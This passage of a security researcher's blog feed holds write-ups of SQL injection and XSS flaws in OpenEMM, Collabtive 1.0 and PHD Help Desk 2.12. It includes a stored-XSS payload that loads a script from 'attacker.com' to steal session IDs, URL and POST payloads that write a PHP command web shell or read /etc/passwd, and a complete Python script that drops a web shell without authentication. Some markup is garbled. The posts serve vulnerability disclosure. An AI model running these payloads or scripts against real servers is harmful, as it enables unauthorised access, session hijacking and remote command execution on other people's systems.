  -i HOST     server address
  -s          fetch all subscribers
  -m MLIST    create new mailing list (XSS)
  &mdash;dm        delete all mailing lists
  &mdash;ds        delete all subscribers
root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -s
&lt;SOAPpy.Types.structType multiRef at 30449464>: {&lsquo;x&rsquo;: [&lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;Last&rsquo;, &lsquo;First&rsquo;, &lsquo;2&rsquo;, &lsquo;29&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;&rsquo;, &lsquo;1&rsquo;, &lsquo;54&rsquo;, &lsquo;6&rsquo;, &lsquo;<a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#102;&#x69;&#x72;&#x73;&#116;&#46;&#108;&#x61;&#x73;&#116;&#x40;&#100;&#111;&#109;&#x61;&#x69;&#x6e;&#x2e;&#x6f;&#x72;&#x67;">&#102;&#x69;&#x72;&#115;&#116;&#46;&#108;&#x61;&#x73;&#x74;&#64;&#x64;&#111;&#x6d;&#x61;&#105;&#x6e;&#46;&#111;&#114;&#x67;</a>&rsquo;, &lsquo;2&rsquo;, &lsquo;6&rsquo;, &lsquo;29&rsquo;, &lsquo;54&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;1&rsquo;]}
&lt;SOAPpy.Types.structType multiRef at 30446728>: {&lsquo;x&rsquo;: [&lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;Name&rsquo;, &lsquo;No&rsquo;, &lsquo;2&rsquo;, &lsquo;29&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;2013&rsquo;, &lsquo;2013-06-29 17:54:02&rsquo;, &lsquo;&rsquo;, &lsquo;1&rsquo;, &lsquo;54&rsquo;, &lsquo;6&rsquo;, &lsquo;<a href="&#109;&#97;&#105;&#x6c;&#116;&#x6f;&#58;&#x6e;&#111;&#46;&#x6e;&#x61;&#x6d;&#101;&#64;&#x79;&#111;&#x75;&#114;&#x64;&#x6f;&#x6d;&#97;&#105;&#110;&#46;&#99;&#x6f;&#109;">&#110;&#111;&#x2e;&#110;&#97;&#109;&#101;&#x40;&#x79;&#x6f;&#x75;&#x72;&#x64;&#x6f;&#109;&#x61;&#x69;&#x6e;&#x2e;&#99;&#x6f;&#x6d;</a>&rsquo;, &lsquo;2&rsquo;, &lsquo;6&rsquo;, &lsquo;29&rsquo;, &lsquo;54&rsquo;, &lsquo;0&rsquo;, &lsquo;17&rsquo;, &lsquo;2&rsquo;]}
[!] Discovered 2 subscribers
root@jali:~/exploits#
```</p>

<p>Our &ldquo;end goal&rdquo; for this exploit is, however, not just adding mailing lists or deleting content; we&rsquo;d like to obtain a web shell.  As OpenEMM is written in Java (struts), Java Server Pages (JSP) are invoked server-side to render client-side pages.  Theoretically, we should be able to dump a malicious JSP file into a readable/writable directory and obtain a remote shell.</p>

<p>Unfortunately (fortunately for users/OpenEMM, though), the user used to connect to the MySQL database does not have FILE permissions:</p>

<p>```
mysql> select user();
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| user()            |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| agnitas@localhost |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
1 row in set (0.00 sec)</p>

<p>mysql> show grants;
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| Grants for agnitas@localhost                                                                                                                       |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| GRANT USAGE ON <em>.</em> TO &lsquo;agnitas&rsquo;@&lsquo;localhost&rsquo; IDENTIFIED BY PASSWORD &lsquo;<em>BC428C4FAA04992D1E8CF04545DD70FA60E588C5&rsquo;                                     |
| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON <code>openemm</code>.</em> TO &lsquo;agnitas&rsquo;@&lsquo;localhost&rsquo;     |
| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON <code>openemm_cms</code>.* TO &lsquo;agnitas&rsquo;@&lsquo;localhost&rsquo; |
+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
3 rows in set (0.00 sec)</p>

<p>mysql>
```</p>

<p>This is the user specified by <code>webapps/openemm/WEB-INF/classes/emm.properties</code>.  As shown, we have only basic access to the databases.  In the event that this user and permissions are modified, it is possible to upload a web shell, but in its default state, you cannot.</p>

<p>From this SQL injection, then, we have authentication bypass and information disclosure.  Because this interface inserts data directly into databases, and does not go through a unified channel (i.e. for their basic sanitation methods), several fields are vulnerable to XSS, including a new mailing list&rsquo;s Description field:</p>

<p><code>
root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -m w00t
[!] Description field vulnerable to stored xss!
[!] Enter mlist description: &lt;script&gt;alert('XSS!')&lt;/script&gt;
[!] Saved successfully
root@jali:~/exploits#
</code></p>

<p><img class="center <a" src="href="http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg">http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg</a>"></p>

<p>With this, we can siphon off session ID&rsquo;s by simply injecting <code>&lt;script src="http://attacker.com"/&gt;</code>.  We do not need to send document.cookie because, surprise, session ID&rsquo;s are not stored as a cookie, but rather passed around through each GET/POST request.  Therefore, the Referrer header will contain the jsessionid required to hijack the session.  Our hijacked request looks as such:</p>

<p>```
root@jali:~/exploits# nc -l -p 80
GET / HTTP/1.1
Host: 192.168.1.147
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
Accept: <em>/</em>
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: <a href="http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1">http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1</a>
Connection: keep-alive</p>

<p>^C
root@jali:~/exploits#
```</p>

<p>We then simply make the same request in the Referrer field and we&rsquo;ve got access to the account.</p>

<p><a href="http://pastebin.com/JLh7BYYj">Exploit</a><br/>
<a href="http://pastebin.com/GXdw3FcQ">wsdl</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Collabtive 1.0 - SQLi]]></title>
    <link href="http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli/"/>
    <updated>2013-06-21T22:40:53-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/06/21/collabtive-1.0-sqli</id>
    <content type="html"><![CDATA[<p><a href="http://collabtive.o-dyn.de/">Collabtive</a> is a web-based collaboration tool for project management, developed in PHP.  The latest version, Collabtive 1.0, is vulnerable to remote authenticated SQL injection.  Sourceforge page can be found <a href="http://sourceforge.net/projects/collabtive/?source=directory">here</a>, which appears to be clocking in just over 1000 downloads a week.  This issue was reported privately to the developers, and fixed in their Github <a href="https://github.com/philippK-de/Collabtive">repository</a>.</p>

<p>User profiles are viewed/managed by manageuser.php, and upon loading a profile, runs the following:</p>

<p>```
 if (!empty($start) and !empty($end)) {</p>

<pre><code>    $track = $tracker-&gt;getUserTrack($id, $fproject, $taski, $start, $end);
} elseif (is_array($fproject)) {
    foreach ($fproject as $fpro) {
        $ptrack = $tracker-&gt;getUserTrack($id, $fpro, $taski, $start, $end);
        if (!empty($ptrack)) {
            foreach ($ptrack as $mytrack) {
                array_push($track, $mytrack);
            }
        }
    }
} 
</code></pre>

<p>```</p>

<p>Of interest is the <code>getUserTrack</code> function, as follows:</p>

<p>```
function getUserTrack($user, $project = 0, $task = 0, $start = 0, $end = 0 , $lim = 50)</p>

<pre><code>{
    global $conn;
    $user = (int) $user;
    $project = (int) $project;
    $lim = (int) $lim;

    if ($project &gt; 0) {
        $sql = "SELECT * FROM timetracker WHERE user = $user AND project = $project";
        $num = "SELECT COUNT(*) FROM timetracker WHERE project = $project AND user = $user";
        $order = " ORDER BY ended ASC";
    } else {
        $sql = "SELECT * FROM timetracker WHERE user = $user";
        $num = "SELECT COUNT(*) FROM timetracker WHERE user = $user";
        $order = " ORDER BY ended ASC";
    }

    if ($task &gt; 0) {
        $sql .= " AND task = $task";
        $num .= " AND task = $task";
    }

    if ($start &gt; 0 and $end &gt; 0) {
        $start = strtotime($start);
        $end = strtotime($end . " +1 day");
        $end = $end - 1;
        $sql .= " AND ended &gt;=$start AND ended&lt;=$end ";
        $num .= " AND ended &gt;=$start AND ended&lt;=$end ";
    }

    if ($num) {
        $num = $conn-&gt;query($num)-&gt;fetch();
        $num = $num[0];
    } else {
        $num = 0;
    }
</code></pre>

<p>```</p>

<p>The start/end/task variables are not cast to integers, and are not sanitized.  Sanitization wouldn&rsquo;t do much here, anyways, as the variables are appended without quotations, so we need only space queries out from input.  For example, <code>task=1 UNION SELECT passwords FROM user</code>.  Thus we highlight the importance of parameterized queries.  Just use them.</p>

<p>This can be exploited with a simple UNION query to drop a shell:</p>

<p><code>
http://192.168.1.219/collabtive/manageuser.php?action=profile&amp;id=1&amp;task=1%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e%20INTO%20OUTFILE%20%27hcked%27;&amp;project=1
</code></p>

<p>Exploiting:</p>

<p><code>
root@jali:~/exploits# python collabtive_10_sqli.py -i 192.168.1.83 -P vlh4soc9k2t5vnp6s5d8glga17
[!] Dropping web shell on 192.168.1.83...
[!] Shell dropped.  http://192.168.1.83/collabtive/gkre4.php?rr=ls
</code></p>

<p><img class="center <a" src="href="http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg">http://1.bp.blogspot.com/-eVNRT30tTOU/Ub8_vbq_ZiI/AAAAAAAAAgM/ZssKBHVVMNs/s640/collabtive_10_sploit.jpg</a>"></p>

<p><a href="http://www.exploit-db.com/exploits/26410/">Exploit</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PHD Help Desk 2.12 - SQLi/XSS]]></title>
    <link href="http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss/"/>
    <updated>2013-06-02T22:55:27-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/06/02/phd-help-desk-2.12-sqli-xss</id>
    <content type="html"><![CDATA[<p><a href="http://www.p-hd.com.ar/">PHD Help Desk</a> is a help desk application used for managing help tickets in corporate/enterprise environments.  The latest version (2.12) is vulnerable to, well, quite a few instances of SQLi and XSS.  I&rsquo;ll try and go through a couple, but there are so many it&rsquo;s sort of embarrassing, and none of them are at all complex.  The software is clocking ~200 downloads/week on Sourceforge, and no telling how many off their website, so it&rsquo;s definitely still out there somewhere.  These issues have been disclosed to the vendor and a generous amount of time to fix them has since passed.</p>

<p>The first place we&rsquo;ll start is <code>login.php</code>, which tellingly holds all of the login logic.  Here&rsquo;s the relevant bit:</p>

<p>```
$operador=trim(strip_tags($_POST[operador]));
$query=&ldquo;SELECT * FROM {$MyPHD}operador WHERE operador_id=&lsquo;$operador&rsquo;&rdquo;;
$result=mysql_query($query) or die(mysql_error());
$q_filas=mysql_num_rows($result);</p>

<p>if($q_filas!=1)</p>

<pre><code>   {$mensaje=$Oper_not_autorized;
    require($Include.'login.inc');
    exit();
   }
</code></pre>

<h3>Ahora verifico la contrase√±a</h3>

<p>$md5_contrasenia=md5($_POST[&lsquo;contrasenia&rsquo;]);</p>

<p>$query=&ldquo;SELECT * FROM {$MyPHD}operador WHERE operador_id=&lsquo;$operador&rsquo; AND contrasenia=&lsquo;$md5_contrasenia&rsquo;&rdquo;;
$result=mysql_query($query) or die (mysql_error());;
$q_filas=mysql_num_rows($result);</p>

<p>if ($q_filas!=1)</p>

<pre><code>         {$mensaje=$Invalid_passwd;
         require($Include.'login.inc');
         exit();
        }
</code></pre>

<p>$data=mysql_fetch_array($result);
if ($data[&lsquo;nivel&rsquo;]&lt;1)</p>

<pre><code>           {$mensaje=$Oper_not_autorized;
            require($Include.'login.inc');
            exit();
           }
</code></pre>

<p>```</p>

<p>This doesn&rsquo;t even really try to sanitize anything.  <a href="http://php.net/manual/en/function.strip-tags.php">strip_tags</a> is used to remove HTML and PHP tags from a string, and <a href="http://php.net/manual/en/function.trim.php">trim</a> strips whitespace; what?  It pulls out the username, checks it in the database, then pulls the password, md5&rsquo;s it, and checks that in the database.  Plenty of opportunity for SQLi, but no way to get around the login screen with a simple <code>' OR '1=1</code>, due to the final query using the md5 of the password.  We could use a malicious username and comment that out, but then the first query would fail.  So instead, we&rsquo;ll just use the username to run malicious queries.</p>

<p>Submitting the following POST data to login.php will dump <code>/etc/passwd</code></p>

<p><code>
operador=' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE '/var/www/phd_2_12/psswd&amp;contrasenia=asdf&amp;submit=Enter&amp;captcha=
</code></p>

<p><img class="center <a" src="href="http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg">http://4.bp.blogspot.com/-Ss9O_o4PeAI/UaBAiG65xPI/AAAAAAAAAfI/CvOmVOtxEVw/s640/phd_psswd.jpg</a>"></p>

<p>With this, we can naturally obtain a web shell, as demonstrated by the exploit code I&rsquo;ve developed:</p>

<p>```
root@jali:~# python phd_sqli.py -h
usage: phd_sqli.py [-h] [-i IP] [-p ROOTP] [-w PATH]</p>

<p>optional arguments:
  -h, &mdash;help  show this help message and exit
  -i IP       server address
  -p ROOTP    path to login.php (/phd_2_12)
  -w PATH     writable web path (/var/www/phd_2_12) for shell
root@jali:~# python phd_sqli.py -i 192.168.1.83
[!] Dropping web shell on 192.168.1.83&hellip;
[!] Shell dropped.  <a href="http://192.168.1.83/phd_2_12/0m05k.php?rr=ls">http://192.168.1.83/phd_2_12/0m05k.php?rr=ls</a>
root@jali:~#
<code>``
As a note,</code>strip_slashes` prevents us from submitting anything that includes HTML or PHP tags in it. So I&rsquo;ve gotten around that by simply hex encoding the string:</p>

<p>```</p>

<h1>&lt;? php system($_GET[&ldquo;rr&rdquo;]); ?></h1>

<p>data = urllib.urlencode({&lsquo;operador&rsquo;:(&lsquo;\&rsquo; UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'</p>

<pre><code>                                 ',2,3,4,5,6,7,8,9,10,11,12,13,14 INTO OUTFILE'
                                 ' \'{0}/{1}.php'.format(options.path,shell)),
                     'contrasenia':'pass',
                     'submit':'Enter',
                     'captcha':''})
</code></pre>

<p>```</p>

<p>There&rsquo;s another SQLi vulnerability in <code>abro_adjunto.php</code>, which requires authentication to the application:</p>

<p>```
if (isSet($_GET[&lsquo;file&rsquo;]))</p>

<pre><code>{$query="SELECT *
         FROM {$MyPHD}sigo_ticket
         WHERE seq_sigo_ticket_id={$_GET['file']} ";

 $result=mysql_query($query) or die (mysql_error());

 $row = mysql_fetch_array($result);

 $tipo_adjunto = $row['tipo_adjunto'];
 $adjunto = $row['adjunto'];
 $nombre_adjunto = $row['nombre_adjunto'];

 if(strlen($nombre_adjunto)&gt;1)
    {header("Content-type: $tipo_adjunto");
     header("Content-Disposition: attachment; filename=\"$nombre_adjunto\"");
     echo $adjunto;
    }
 else
    {require('head.inc');
     echo "&lt;div class='error'&gt;INVALID CALL &lt;/div&gt;";
    }
}
</code></pre>

<p>```</p>

<p>And the sanitization for this (and most files, really) is as follows:</p>

<p>```
if (get_magic_quotes_gpc())</p>

<pre><code>{ foreach($_GET as $clave =&gt; $valor)
  {$_GET[$clave]=stripslashes($_GET[$clave]);
  }
}
</code></pre>

<p>foreach($_GET as $clave => $valor)</p>

<pre><code> {$_GET[$clave]=trim(htmlentities($_GET[$clave],ENT_QUOTES));
 }
</code></pre>

<p>```</p>

<p><a href="http://php.net/manual/en/function.htmlentities.php">htmlentities</a>, when specified with the ENT_QUOTES flag, will convert both single and double quotes into HTML entities, and will thus not be injectable.  However, the above query doesn&rsquo;t even use quotes, thus there is nothing to escape.</p>

<p>There&rsquo;s stored XSS within all Attributes (Contact, Process, State, Type) that&rsquo;s loaded when viewing users:</p>

<p><img class="center <a" src="href="http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg">http://3.bp.blogspot.com/-AswfkyCHhRo/UaBswveQO1I/AAAAAAAAAfo/vBJREQ-qHjE/s640/phd_xss.jpg</a>"></p>

<p>Here&rsquo;s the code for dropping a web shell; enjoy:</p>

<p>```</p>

<h1>Exploit Title: PHD Help Desk 2.12 SQLi</h1>

<h1>Date: 05/24/2013</h1>

<h1>Exploit Author: drone (@dronesec)</h1>

<h1>Vendor Homepage: <a href="http://www.p-hd.com.ar/">http://www.p-hd.com.ar/</a></h1>

<h1>Software Link: <a href="http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip">http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip</a></h1>

<h1>Version: 2.12</h1>

<h1>Tested on: Ubuntu 12.04 (apparmor disabled)</h1>

<p>&ldquo;&rdquo;&ldquo; This app is so full of SQLi &amp; XSS; if you&rsquo;re looking for</p>

<pre><code>practice with real web apps, this is a good place to go.

You don't need auth for this.
@dronesec
</code></pre>

<p>&ldquo;&rdquo;&ldquo;
from argparse import ArgumentParser
import string
import random
import urllib, urllib2
import sys</p>

<p>def run(options):</p>

<pre><code>print '[!] Dropping web shell on %s...'%(options.ip)

shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))

# &lt;? php system($_GET["rr"]); ?&gt;
data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
                                ',null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE'
                                    ' \'{0}/{1}.php'.format(options.path,shell)),
                         'contrasenia':'pass',
                         'submit':'Enter',
                         'captcha':''})

urllib2.urlopen('http://{0}{1}/login.php'.format(options.ip, options.rootp), data)
print '[!] Shell dropped.  http://%s%s/%s.php?rr=ls'%(options.ip,options.rootp,shell)
</code></pre>

<p>def parse():</p>

<pre><code>parser = ArgumentParser()
parser.add_argument('-i',help='server address',action='store',dest='ip')
parser.add_argument('-p',help='path to login.php (/phd_2_12)',action='store',
            default='/phd_2_12', dest='rootp')
parser.add_argument('-w',help='writable web path (/var/www/phd_2_12) for shell',
            default='/var/www/phd_2_12/', action='store', dest='path')

options = parser.parse_args()
if not options.ip:
    parser.print_help()
    sys.exit(1)

options.path = options.path if options.path[-1] != '/' else options.path[:-1]
options.rootp = options.rootp if options.path[-1] != '/' else options.path[:-1]
return options
</code></pre>

<p>if <strong>name</strong>==&ldquo;<strong>main</strong>&rdquo;:</p>

<pre><code>run(parse())
</code></pre>

<p>```</p>

<p><a href="http://www.exploit-db.com/exploits/25915/">Exploit</a></p>
]]></content>
  </entry>
  
</feed>
